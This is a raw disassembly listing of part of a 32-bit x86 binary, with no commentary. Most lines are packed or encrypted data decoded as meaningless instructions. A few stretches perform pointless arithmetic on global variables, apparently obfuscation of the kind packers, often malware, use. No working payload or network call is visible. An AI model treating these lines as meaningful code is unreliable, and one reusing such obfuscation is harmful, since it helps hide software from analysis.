  40a502:	mov    bh,0x77
  40a504:	mov    esp,0xc8bcdbc3
  40a509:	inc    eax
  40a50a:	adc    eax,0x1e027488
  40a50f:	ret    0x92bf
  40a512:	or     ebp,DWORD PTR [edx]
  40a514:	cmp    BYTE PTR [edi+0x49],dl
  40a517:	or     ebp,ebx
  40a519:	addr16 xchg ebp,eax
  40a51b:	xor    dh,0xf8
  40a51e:	jb     0x40a553
  40a520:	mov    esi,0x488b8e81
  40a525:	pop    ss
  40a526:	jnp    0x40a545
  40a528:	mov    WORD PTR [ebp+0x7755c60c],fs
  40a52e:	push   ebp
  40a52f:	xchg   edi,eax
  40a530:	fadd   DWORD PTR [eax+0x1d]
  40a533:	or     DWORD PTR [esi-0x17],esi
  40a536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a537:	jb     0x40a50d
  40a539:	es jns 0x40a58a
  40a53c:	adc    DWORD PTR ds:0xb57416c9,esp
  40a542:	dec    ecx
  40a543:	shr    BYTE PTR [ebx+0x7b],cl
  40a546:	lds    ebx,FWORD PTR [eax+eax*8+0x560a166a]
  40a54d:	stc    
  40a54e:	mov    eax,0xdda72c8b
  40a553:	fdivrp st(7),st
  40a555:	and    ch,BYTE PTR [edi]
  40a557:	inc    ebx
  40a558:	addr16 mov ds:0xb1d7,eax
  40a55c:	mov    dl,0x3
  40a55e:	sbb    ah,al
  40a560:	and    eax,0xd6d941db
  40a565:	(bad)  
  40a566:	pop    eax
  40a567:	inc    eax
  40a568:	div    DWORD PTR [eax]
  40a56a:	pop    esp
  40a56b:	push   edi
  40a56c:	arpl   WORD PTR [eax-0x75],cx
  40a56f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a570:	mov    edi,0xd197482f
  40a575:	shr    BYTE PTR [ecx],1
  40a577:	sub    DWORD PTR [edx+0x72],edx
  40a57a:	or     DWORD PTR [edi],edi
  40a57c:	fmul   QWORD PTR [edx+0x16c2640e]
  40a582:	sbb    al,0xde
  40a584:	jmp    0xe2ecdb1d
  40a589:	(bad)  
  40a58b:	cmp    DWORD PTR [ecx-0x4fc5ebf9],esi
  40a591:	popa   
  40a592:	and    BYTE PTR [esi+ebp*8-0x1cf66ba1],bh
  40a599:	xchg   eax,ebx
  40a59b:	mov    ebx,0xeca896cf
  40a5a0:	leave  
  40a5a1:	xor    al,bl
  40a5a3:	and    bl,BYTE PTR [eax-0x41]
  40a5a6:	xchg   edx,eax
  40a5a7:	ds fs push ss
  40a5aa:	(bad)  
  40a5ad:	dec    eax
  40a5ae:	mov    dh,BYTE PTR [ebx]
  40a5b0:	repnz and edx,DWORD PTR ds:0xa13e3271
  40a5b7:	xchg   esp,eax
  40a5b8:	enter  0x459d,0x1d
  40a5bc:	mov    eax,ds:0x30937abf
  40a5c1:	push   esp
  40a5c2:	(bad)  
  40a5c4:	xor    ch,0x29
  40a5c7:	xor    al,0x1d
  40a5c9:	sbb    al,0xfc
  40a5cb:	cmp    esi,DWORD PTR [edx+0x64]
  40a5ce:	jmp    FWORD PTR [esi]
  40a5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5d1:	sbb    BYTE PTR [ecx+0x7ff627f1],0x4c
  40a5d8:	adc    ebx,0x75
  40a5db:	or     DWORD PTR [edi],ebx
  40a5dd:	push   ebp
  40a5de:	push   ds
  40a5df:	mov    edx,0x26c12f96
  40a5e4:	sub    DWORD PTR [ecx+esi*2-0x7046b7ed],ebp
  40a5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5ec:	frstor [ecx]
  40a5ee:	mov    edx,0xde40c2bc
  40a5f3:	mov    eax,ds:0x3718b0d8
  40a5f8:	push   eax
  40a5f9:	adc    dl,BYTE PTR [ebp+0x4e]
  40a5fc:	xchg   edx,eax
  40a5fd:	scas   eax,DWORD PTR es:[edi]
  40a5fe:	xchg   ebp,eax
  40a5ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a600:	pop    eax
  40a601:	dec    edi
  40a602:	out    dx,eax
  40a603:	scas   eax,DWORD PTR es:[edi]
  40a604:	adc    BYTE PTR [edi+esi*2],dh
  40a607:	inc    esp
  40a608:	xor    eax,0x1753e1ad
  40a60d:	or     eax,0xd3572095
  40a612:	dec    edx
  40a613:	cmc    
  40a614:	and    DWORD PTR [ebp-0x2f],ecx
  40a617:	jns    0x40a614
  40a619:	ret    
  40a61a:	jns    0x40a5d4
  40a61c:	mov    ?,WORD PTR [esi]
  40a61e:	iret   
  40a61f:	jge    0x40a657
  40a621:	xchg   ebp,eax
  40a622:	repnz inc esi
  40a624:	jne    0x40a677
  40a626:	ficom  DWORD PTR [ecx]
  40a628:	push   esi
  40a629:	jle    0x40a639
  40a62b:	inc    edx
  40a62c:	push   ds
  40a62d:	sub    dh,al
  40a62f:	xor    BYTE PTR [eax],cl
  40a631:	in     al,dx
  40a632:	jb     0x40a633
  40a634:	(bad)  [edi]
  40a636:	ss or  al,0xd2
  40a63a:	mov    es,WORD PTR [esi+0x58]
  40a63d:	pop    ebx
  40a63e:	adc    eax,0xc73af46b
  40a643:	pop    eax
  40a644:	dec    esi
  40a645:	repz xor bh,BYTE PTR [ecx]
  40a648:	and    BYTE PTR [ebx-0x1098a07e],ah
  40a64e:	cmp    al,0x9f
  40a650:	inc    DWORD PTR [ebp+0x408284a9]
  40a656:	push   ecx
  40a657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a658:	scas   al,BYTE PTR es:[edi]
  40a659:	data16 add al,0x1b
  40a65c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a65d:	mov    eax,0xf578d68b
  40a662:	xchg   edi,eax
  40a663:	sub    eax,0x991c8fd4
  40a668:	addr16 xchg edi,eax
  40a66a:	xchg   DWORD PTR [esi-0x3f302fcd],edx
  40a670:	ins    BYTE PTR es:[edi],dx
  40a671:	ret    0x752c
  40a674:	(bad)  
  40a675:	fcomp  DWORD PTR [edi]
  40a677:	not    DWORD PTR [edx-0x2b9258be]
  40a67d:	mov    al,0xa0
  40a67f:	jp     0x40a6a2
  40a681:	fwait
  40a682:	stos   DWORD PTR es:[edi],eax
  40a683:	cld    
  40a684:	shl    esi,0x7d
  40a687:	enter  0xeeb1,0x30
  40a68b:	in     eax,0x4f
  40a68d:	push   0x3f168d12
  40a692:	mov    bh,0xec
  40a694:	in     eax,0x2
  40a696:	mov    ds:0xdfe2d445,al
  40a69b:	dec    ebp
  40a69c:	test   BYTE PTR [ecx+edx*1-0x4e],0x4a
  40a6a1:	es jns 0x40a658
  40a6a4:	inc    esp
  40a6a5:	comiss xmm3,DWORD PTR [eax+0x2b]
  40a6a9:	(bad)  
  40a6aa:	bound  esi,QWORD PTR [esi+0x7a]
  40a6ad:	loop   0x40a6c7
  40a6af:	dec    ecx
  40a6b0:	mov    ebx,0xf3b2385d
  40a6b5:	aam    0x9
  40a6b7:	mov    esp,0xd910cc10
  40a6bc:	test   ebx,edx
  40a6be:	and    eax,0xfff89f74
  40a6c3:	mov    gs,WORD PTR [esi-0xdffa0a]
  40a6c9:	push   edi
  40a6ca:	dec    eax
  40a6cb:	and    eax,0xe78dc1a3
  40a6d0:	mov    BYTE PTR [ecx-0x46],ah
  40a6d3:	jmp    0x40a690
  40a6d5:	pop    eax
  40a6d6:	outs   dx,DWORD PTR ds:[esi]
  40a6d7:	and    DWORD PTR [esi-0x16],edx
  40a6da:	and    eax,0xbbc77275
  40a6df:	test   al,0x0
  40a6e1:	(bad)  
  40a6e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6e3:	inc    ebx
  40a6e4:	dec    esp
  40a6e5:	(bad)  
  40a6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6e7:	dec    edx
  40a6e8:	ds xchg edi,eax
  40a6ea:	int    0x20
  40a6ec:	imul   edi,DWORD PTR [ebx],0x6b05c7f8
  40a6f2:	ss inc ebx
  40a6f4:	add    BYTE PTR [eax+0xf00005a],ch
  40a6fa:	test   edi,esp
  40a6fc:	or     eax,0x15810000
  40a701:	push   edi
  40a702:	ss inc ebx
  40a704:	add    dl,bh
  40a706:	or     eax,DWORD PTR [eax]
  40a708:	add    bh,bh
  40a70a:	jne    0x40a714
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xba36ec0c
  40a7ac:	rcr    bl,1
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	mov    ebp,0x5a28c051
  40a7bb:	clc    
  40a7bc:	fld    st(5)
  40a7be:	add    eax,0xd1d92d93
  40a7c3:	sbb    edi,DWORD PTR [ecx-0x484ebb76]
  40a7c9:	jb     0x40a76d
  40a7cb:	repz xor al,0xc6
  40a7ce:	add    BYTE PTR [esi-0x5877a536],dl
  40a7d4:	les    ebx,FWORD PTR [ebp+0x3a]
  40a7d7:	jp     0x40a845
  40a7d9:	ds sub al,0x1d
  40a7dc:	ins    DWORD PTR es:[edi],dx
  40a7dd:	inc    ebx
  40a7de:	dec    esp
  40a7df:	inc    eax
  40a7e0:	inc    ebx
  40a7e1:	pop    esp
  40a7e2:	clc    
  40a7e3:	lea    esi,[ebx]
  40a7e5:	xchg   DWORD PTR [ebx-0x2bb47fc1],ebp
  40a7eb:	or     BYTE PTR [ecx+0x73],dl
  40a7ee:	mov    eax,ds:0xeab486d7
  40a7f3:	dec    edx
  40a7f4:	sub    BYTE PTR [edi],ch
  40a7f6:	cmp    DWORD PTR [ecx-0x79],ebp
  40a7f9:	(bad)  
  40a7fa:	push   es
  40a7fb:	dec    edi
  40a7fc:	adc    edi,DWORD PTR [edi]
  40a7fe:	sub    BYTE PTR [esi],ch
  40a800:	inc    eax
  40a801:	sub    ch,BYTE PTR [eax]
  40a803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a804:	sub    esp,DWORD PTR [edx-0x6]
  40a807:	arpl   WORD PTR [esi+0x30],bp
  40a80a:	test   BYTE PTR [edx+0x24],0xca
  40a80e:	in     al,dx
  40a80f:	je     0x40a81c
  40a811:	push   edx
  40a812:	sub    bl,BYTE PTR [esi+0x77fdb8be]
  40a818:	aas    
  40a819:	fild   QWORD PTR [ecx-0x10]
  40a81c:	mov    bl,0x8a
  40a81e:	dec    eax
  40a81f:	icebp  
  40a820:	xor    al,0x22
  40a822:	les    ebp,FWORD PTR [ebx+eiz*8-0xd]
  40a826:	add    esi,DWORD PTR [edi*8-0x33aee6af]
  40a82d:	push   ebp
  40a82e:	mov    es,WORD PTR [eax+0x25359c3]
  40a834:	out    0x1a,eax
  40a836:	mov    ah,0x27
  40a838:	jl     0x40a7e1
  40a83a:	xor    bl,dh
  40a83c:	ja     0x40a7d9
  40a83e:	js     0x40a896
  40a840:	cld    
  40a841:	mov    bl,BYTE PTR ds:0x1777c20b
  40a847:	xchg   edi,eax
  40a848:	inc    esi
  40a849:	and    BYTE PTR ds:0xb3c580e7,dh
  40a84f:	xor    ecx,DWORD PTR [ebp-0xf958e21]
  40a855:	sti    
  40a856:	stos   BYTE PTR es:[edi],al
  40a857:	and    eax,0xdbd4c3f5
  40a85c:	stos   DWORD PTR es:[edi],eax
  40a85d:	adc    BYTE PTR [esi+0x46203c4e],dh
  40a863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a864:	sub    al,0xaf
  40a866:	cmp    ah,BYTE PTR [ecx]
  40a868:	mov    edx,0x23ea9d3d
  40a86d:	pushf  
  40a86e:	mov    DWORD PTR [edx],edi
  40a870:	jmp    0x636400d1
  40a875:	push   ds
  40a876:	int    0x52
  40a878:	adc    eax,0x1ecd4a5c
  40a87d:	and    BYTE PTR [edi+eiz*2],cl
  40a880:	adc    BYTE PTR [edx+0x19],bl
  40a883:	sub    bl,BYTE PTR [ebp+0x5b]
  40a886:	(bad)  
  40a887:	bound  eax,QWORD PTR [ebx-0x2]
  40a88a:	jl     0x40a8ef
  40a88c:	and    DWORD PTR [edx+0x26a19104],esp
  40a892:	fisubr DWORD PTR [ecx-0x312e7e36]
  40a898:	xchg   esi,eax
  40a899:	mov    ah,dl
  40a89b:	in     eax,dx
  40a89c:	js     0x40a8e7
  40a89e:	fisubr WORD PTR [edi]
  40a8a0:	test   DWORD PTR [edx-0x15],esp
  40a8a3:	jo     0x40a896
  40a8a5:	fldcw  WORD PTR [edx+0x79cd5121]
  40a8ab:	or     eax,0x8da6902
  40a8b0:	ins    BYTE PTR es:[edi],dx
  40a8b1:	dec    edi
  40a8b2:	mov    ch,0x88
  40a8b4:	test   al,0xd3
  40a8b6:	xchg   BYTE PTR ds:0x4a53c592,cl
  40a8bc:	xchg   esi,ecx
  40a8be:	mov    bl,0x8e
  40a8c0:	sbb    eax,0xd547a948
  40a8c5:	mov    ds:0x968dafc7,al
  40a8ca:	cli    
  40a8cb:	retf   
  40a8cc:	mov    esp,edx
  40a8ce:	add    eax,0xbd942977
  40a8d3:	jle    0x40a88c
  40a8d5:	(bad)  
  40a8d6:	pop    ecx
  40a8d7:	jg     0x40a8fd
  40a8d9:	lods   al,BYTE PTR ds:[esi]
  40a8da:	sub    DWORD PTR [ebx],0xffffffab
  40a8dd:	dec    DWORD PTR [eax-0x6c96bfff]
  40a8e3:	mov    edx,0x18e59c43
  40a8e8:	lock mov DWORD PTR [ebp-0x62],ebx
  40a8ec:	sbb    DWORD PTR [ebx+0x10a6c039],0xffffffa4
  40a8f3:	ret    
  40a8f4:	call   0x53196eda
  40a8f9:	(bad)  
  40a8fa:	mov    edx,0xf80fc3b9
  40a8ff:	not    DWORD PTR ds:0x757df3cc
  40a905:	arpl   dx,di
  40a907:	pop    edx
  40a908:	jns    0x40a962
  40a90a:	adc    cl,BYTE PTR [ecx+edi*1]
  40a90d:	adc    eax,0x252ab998
  40a912:	fwait
  40a913:	dec    edx
  40a914:	or     al,0x98
  40a916:	jmp    0x70df525c
  40a91b:	and    BYTE PTR [edx+0x6e],cl
  40a91e:	inc    ecx
  40a91f:	sbb    bl,BYTE PTR [ebx]
  40a921:	dec    edx
  40a922:	mov    esi,0x1fdff6c
  40a927:	jae    0x40a926
  40a929:	lods   al,BYTE PTR ds:[esi]
  40a92a:	leave  
  40a92b:	and    al,0x48
  40a92d:	add    DWORD PTR [ebx],edx
  40a92f:	in     eax,0xc1
  40a931:	fsubr  DWORD PTR [ecx+0x38f88194]
  40a937:	push   ecx
  40a938:	jmp    0x40a984
  40a93a:	neg    DWORD PTR [edx]
  40a93c:	cdq    
  40a93d:	lds    ebp,FWORD PTR [ecx+esi*4+0xb26183f]
  40a944:	jno    0x40a97e
  40a946:	and    esi,DWORD PTR [ecx+0xf]
  40a949:	mov    bh,0x67
  40a94b:	and    al,0x4c
  40a94d:	jecxz  0x40a960
  40a94f:	push   ds
  40a950:	jmp    0x40a8d8
  40a952:	ins    DWORD PTR es:[edi],dx
  40a953:	cmovbe eax,DWORD PTR [ecx]
  40a956:	and    eax,0x60d660ef
  40a95b:	or     ebp,DWORD PTR [ebx]
  40a95d:	mov    ah,cl
  40a95f:	ret    0xb1ee
  40a962:	cmp    DWORD PTR [ecx+ebx*2-0x1f],0xffffff86
  40a967:	retf   
  40a968:	add    esp,esi
  40a96a:	stc    
  40a96b:	cmp    esp,edi
  40a96d:	unpcklps xmm1,XMMWORD PTR [ecx]
  40a970:	test   BYTE PTR [ebx+0x3ddd5b0b],ch
  40a976:	shl    DWORD PTR [ebp+0x64],0x15
  40a97a:	jle    0x40a9e5
  40a97c:	mov    cl,dh
  40a97e:	xchg   edi,eax
  40a97f:	cmp    al,0xdf
  40a981:	gs jmp 0x40a976
  40a984:	adc    edx,ebp
  40a986:	(bad)  
  40a987:	mov    ebx,0x40a49f1b
  40a98c:	sar    DWORD PTR [esi+edx*2],cl
  40a98f:	inc    ecx
  40a990:	sub    ch,bh
  40a992:	mov    ch,0x0
  40a994:	sub    esi,0x5460f87f
  40a99a:	daa    
  40a99b:	int    0x21
  40a99d:	ret    0xa16a
  40a9a0:	cmp    BYTE PTR [edx],0x5b
  40a9a3:	sub    BYTE PTR [ecx-0x3c1e9b17],cl
  40a9a9:	pop    edx
  40a9aa:	loop   0x40a9fb
  40a9ac:	cdq    
  40a9ad:	dec    esi
  40a9ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9af:	pop    cx
  40a9b1:	mov    al,0xda
  40a9b3:	pop    eax
  40a9b4:	imul   edx,esi,0xffffff9b
  40a9b7:	sub    al,0x9d
  40a9b9:	scas   eax,DWORD PTR es:[edi]
  40a9ba:	sub    DWORD PTR [edx-0x154c831f],esi
  40a9c0:	call   0x39bca61f
  40a9c5:	jp     0x40aa3b
  40a9c7:	pop    esi
  40a9c8:	sbb    al,0xff
  40a9ca:	or     eax,0xa7634b00
  40a9cf:	retf   
  40a9d0:	sub    BYTE PTR [edx+0x58],ch
  40a9d3:	push   eax
  40a9d4:	dec    edx
  40a9d5:	xor    al,0x8e
  40a9d7:	popf   
  40a9d8:	out    0x31,al
  40a9da:	push   es
  40a9db:	xchg   edx,eax
  40a9dc:	popa   
  40a9dd:	mov    al,0x2
  40a9df:	jne    0x40a989
  40a9e1:	and    DWORD PTR ds:0x93a63ce6,0x97f5a79
  40a9eb:	inc    esi
  40a9ec:	shl    DWORD PTR [ebx+0x5e5ae613],1
  40a9f2:	mov    bl,bl
  40a9f4:	cmp    DWORD PTR [edi],edx
  40a9f6:	imul   ecx,DWORD PTR ds:0x9441316e,0x8bec4589
  40aa00:	inc    ebp
  40aa01:	cld    
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	sub    al,0x79
  40aa36:	mov    esp,0x7eebd08b
  40aa3b:	jle    0x40aa75
  40aa3d:	jl     0x40aabd
  40aa3f:	jle    0x40aa1d
  40aa41:	xchg   edi,eax
  40aa42:	pop    ebx
  40aa43:	push   ecx
  40aa44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa45:	js     0x40aa9d
  40aa47:	mov    al,ds:0x145b59f0
  40aa4c:	cdq    
  40aa4d:	or     DWORD PTR [edi+edi*8-0x600a68eb],edi
  40aa54:	aad    0x55
  40aa56:	bound  ebx,QWORD PTR [edi]
  40aa58:	loopne 0x40a9e4
  40aa5a:	cmp    eax,0x1b34c6c2
  40aa5f:	xchg   esi,eax
  40aa60:	pop    ebx
  40aa61:	sbb    al,0xb3
  40aa63:	loop   0x40aab8
  40aa65:	and    eax,0x23945678
  40aa6a:	(bad)  
  40aa6b:	cmc    
  40aa6c:	xchg   ecx,eax
  40aa6d:	mov    esi,0x2462b541
  40aa72:	(bad)  ds:0x5a09f375
  40aa78:	pushf  
  40aa79:	and    BYTE PTR [ecx-0x3a],dl
  40aa7c:	adc    eax,0x5365ffa9
  40aa81:	xchg   edx,eax
  40aa82:	ret    0xb6f2
  40aa85:	rcr    BYTE PTR [ebp-0x26],cl
  40aa88:	out    0xff,al
  40aa8a:	inc    esp
  40aa8b:	jae    0x40aa89
  40aa8d:	ror    DWORD PTR [ebp+0x2421efa5],cl
  40aa93:	inc    eax
  40aa94:	(bad)  
  40aa95:	mov    ah,0x44
  40aa97:	push   ebx
  40aa98:	jp     0x40aa44
  40aa9a:	jge    0x40aa23
  40aa9c:	test   BYTE PTR [edi],cl
  40aa9e:	and    esp,DWORD PTR [ebx+0x9]
  40aaa1:	icebp  
  40aaa2:	inc    esi
  40aaa3:	imul   ebp,DWORD PTR [ecx],0x47522253
  40aaa9:	mov    al,0x6b
  40aaab:	push   esi
  40aaac:	mov    ch,0x16
  40aaae:	xor    bh,BYTE PTR [ebp-0x44]
  40aab1:	mov    edx,0xb29975d5
  40aab6:	push   ebx
  40aab7:	pop    edi
  40aab8:	mov    DWORD PTR [ebp+0x6579c179],esi
  40aabe:	sbb    al,0xfe
  40aac0:	rcl    DWORD PTR [esi-0x5a],cl
  40aac3:	lock nop
  40aac5:	out    0x75,eax
  40aac7:	mov    ch,0x54
  40aac9:	and    al,0xa9
  40aacb:	push   esi
  40aacc:	push   esp
  40aacd:	dec    edx
  40aace:	mov    dl,0x99
  40aad0:	and    esp,DWORD PTR [esi-0x9]
  40aad3:	inc    eax
  40aad4:	aaa    
  40aad5:	mov    DWORD PTR [ecx+0x44d65416],eax
  40aadb:	mov    ebp,DWORD PTR [esi]
  40aadd:	rcr    dh,1
  40aadf:	pop    edx
  40aae0:	clc    
  40aae1:	mul    dl
  40aae3:	dec    eax
  40aae4:	pop    edx
  40aae5:	sbb    esi,ebp
  40aae7:	(bad)  
  40aae8:	pusha  
  40aae9:	(bad)  
  40aaea:	xchg   esp,eax
  40aaeb:	sub    BYTE PTR [ebp+0x15],bl
  40aaee:	push   0x38
  40aaf0:	push   ecx
  40aaf1:	mov    ebp,0x237f6869
  40aaf6:	(bad)  
  40aaf7:	and    al,0x10
  40aaf9:	fldcw  WORD PTR [eax+0x3752727b]
  40aaff:	sub    DWORD PTR [ebx-0x4a],edi
  40ab02:	stos   DWORD PTR es:[edi],eax
  40ab03:	sub    eax,0x91991b68
  40ab08:	ja     0x40ab64
  40ab0a:	push   ss
  40ab0b:	data16 or al,0xf4
  40ab0e:	inc    ebp
  40ab0f:	mov    esi,0x987b61a8
  40ab14:	mov    ebp,0x93ec83e2
  40ab19:	xchg   ebp,eax
  40ab1a:	popa   
  40ab1b:	outs   dx,DWORD PTR ds:[esi]
  40ab1c:	dec    eax
  40ab1d:	pop    ecx
  40ab1e:	rcl    BYTE PTR [esi],0xbf
  40ab21:	(bad)  
  40ab22:	(bad)  
  40ab23:	pop    edi
  40ab24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab25:	scas   eax,DWORD PTR es:[edi]
  40ab26:	jbe    0x40ab82
  40ab28:	loop   0x40ab53
  40ab2a:	mov    ds:0xc279162f,eax
  40ab2f:	or     BYTE PTR [edx-0x56],dh
  40ab32:	enter  0xb38c,0x4
  40ab36:	rcr    DWORD PTR ds:0x7f4f826b,0x1
  40ab3d:	stc    
  40ab3e:	arpl   WORD PTR [edx+ebx*4-0x18],di
  40ab42:	ds adc al,0xa3
  40ab45:	sbb    al,BYTE PTR [eax-0x77f18bd9]
  40ab4b:	(bad)  
  40ab4d:	pusha  
  40ab4e:	mov    WORD PTR [esi*8-0x647289e2],?
  40ab55:	aam    0x10
  40ab57:	fisttp DWORD PTR [esi-0x294db476]
  40ab5d:	out    dx,eax
  40ab5e:	jo     0x40aba9
  40ab60:	sub    DWORD PTR [esi+0x0],esp
  40ab63:	stc    
  40ab64:	(bad)  
  40ab65:	sub    DWORD PTR ds:0x4784afd9,ebp
  40ab6b:	repnz aaa 
  40ab6d:	jb     0x40abda
  40ab6f:	fwait
  40ab70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab71:	mov    al,0x1c
  40ab73:	mov    WORD PTR [ebx-0x52],?
  40ab76:	retf   0x7451
  40ab79:	xchg   esp,eax
  40ab7a:	push   0xffffff98
  40ab7c:	inc    eax
  40ab7d:	xchg   ecx,eax
  40ab7e:	sub    edx,edi
  40ab80:	(bad)  
  40ab81:	cwde   
  40ab82:	call   0x7583:0x1306adf5
  40ab89:	mov    dl,0x18
  40ab8b:	add    bh,BYTE PTR [ebx+esi*4-0x7b]
  40ab8f:	mov    esi,0xb8430a5f
  40ab94:	js     0x40abed
  40ab96:	jecxz  0x40abd2
  40ab98:	cs add ecx,ebx
  40ab9b:	lods   eax,DWORD PTR ds:[esi]
  40ab9c:	inc    edx
  40ab9d:	xor    al,BYTE PTR [ebx-0x6b]
  40aba0:	mov    bh,0xbb
  40aba2:	pop    ebp
  40aba3:	jl     0x40abcf
  40aba5:	loopne 0x40abd1
  40aba7:	mov    eax,ds:0x6d0cbdf8
  40abac:	jmp    0xc5d4:0x58aa8ad9
  40abb3:	sbb    ebx,edx
  40abb5:	shl    dh,cl
  40abb7:	imul   edi,DWORD PTR [ecx+0x309d30d],0x2
  40abbe:	lds    ecx,FWORD PTR [eax+eax*8+0x24]
  40abc2:	or     edi,DWORD PTR [esi]
  40abc4:	mov    esp,0x3424a0a1
  40abc9:	loopne 0x40ac24
  40abcb:	and    eax,0x167bf960
  40abd0:	aam    0x31
  40abd2:	sbb    DWORD PTR [eax],ecx
  40abd4:	sub    eax,0xae9b9178
  40abd9:	lahf   
  40abda:	(bad)  
  40abdb:	jmp    0x40ac43
  40abdd:	adc    BYTE PTR [eax+0x7d2edbf1],dh
  40abe3:	inc    ecx
  40abe4:	out    0xf6,eax
  40abe6:	sub    ch,ch
  40abe8:	test   al,0xd2
  40abea:	mov    dh,0x4a
  40abec:	fs ins BYTE PTR es:[edi],dx
  40abee:	or     esi,ebp
  40abf0:	sub    dh,BYTE PTR [edx-0x7d]
  40abf3:	jecxz  0x40abf2
  40abf5:	and    esp,DWORD PTR [esi-0x5395496]
  40abfb:	mov    edx,DWORD PTR [ebx+0x43]
  40abfe:	test   BYTE PTR [edx],dl
  40ac00:	rol    DWORD PTR [esi+0x2c],0x72
  40ac04:	push   0xbd4d6e18
  40ac09:	cmc    
  40ac0a:	fsubr  DWORD PTR ss:[edx-0x3addb4ee]
  40ac11:	fwait
  40ac12:	stos   DWORD PTR es:[edi],eax
  40ac13:	lods   eax,DWORD PTR ds:[esi]
  40ac14:	cmp    ch,ch
  40ac16:	prefetch BYTE PTR es:[esi]
  40ac1a:	pop    esp
  40ac1b:	adc    ecx,DWORD PTR [ebx]
  40ac1d:	xor    esi,DWORD PTR [ebx+0x66]
  40ac20:	sbb    bh,ch
  40ac22:	xor    bl,BYTE PTR [esi+0x4a5ff948]
  40ac28:	ds mov esp,0xa55b9f9e
  40ac2e:	inc    ecx
  40ac2f:	inc    ebx
  40ac30:	and    cl,ah
  40ac32:	out    0x76,eax
  40ac34:	mov    ebx,DWORD PTR [esi+0x73751486]
  40ac3a:	xor    edi,eax
  40ac3c:	dec    edi
  40ac3d:	es dec esi
  40ac3f:	mov    ds:0x6296659a,al
  40ac44:	std    
  40ac45:	(bad)  [ebx+0x4a]
  40ac48:	inc    esi
  40ac49:	or     cl,al
  40ac4b:	mov    ch,0x3d
  40ac4d:	mov    ds:0xa0d9ac0a,al
  40ac52:	xchg   ebx,eax
  40ac53:	les    ebx,FWORD PTR [ebp+0x1f521437]
  40ac59:	mov    esi,0x46654e11
  40ac5e:	dec    ebx
  40ac5f:	cmp    DWORD PTR [ebx+0x4a],ebx
  40ac62:	das    
  40ac63:	leave  
  40ac64:	inc    esp
  40ac65:	pop    ss
  40ac66:	sbb    BYTE PTR [esi],cl
  40ac68:	sbb    edi,edi
  40ac6a:	xlat   BYTE PTR ds:[ebx]
  40ac6b:	mov    ebp,0x380de4f4
  40ac70:	xchg   esi,eax
  40ac71:	rcl    BYTE PTR [ebp-0x3a],0x26
  40ac75:	or     eax,0x3138cf28
  40ac7a:	js     0x43dd2832
  40ac80:	xchg   edi,eax
  40ac81:	add    dh,BYTE PTR [eax+0x3b5c8fba]
  40ac87:	enter  0x840f,0x5f
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [esi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	ss inc ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
